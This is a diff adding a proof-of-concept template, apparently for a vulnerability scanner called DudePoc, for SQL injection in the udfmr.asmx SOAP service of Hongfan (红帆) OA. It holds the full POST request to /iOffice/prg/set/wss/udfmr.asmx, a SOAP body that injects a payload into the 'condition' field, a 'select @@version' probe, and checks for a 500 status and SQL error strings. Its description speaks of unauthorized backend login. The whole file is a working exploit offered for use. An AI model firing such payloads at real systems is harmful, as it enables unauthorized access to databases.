@@ -1,0 +1,25 @@
+﻿<DudePoc_Name>红帆 OA udfmr.asmx 注入</DudePoc_Name>
+<DudePoc_Description>红帆 OA 未授权登录后台</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-Type: text/xml; charset=utf-8
+SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+Connection: close
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+<condition>1=($<AttackCode>$)</condition>
+</GetEmpSearch>
+</soap:Body>
+</soap:Envelope>
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>500</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?(?:nvarchar|System.Web.Services)).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode>select @@version</DudePoc_AttackCode>
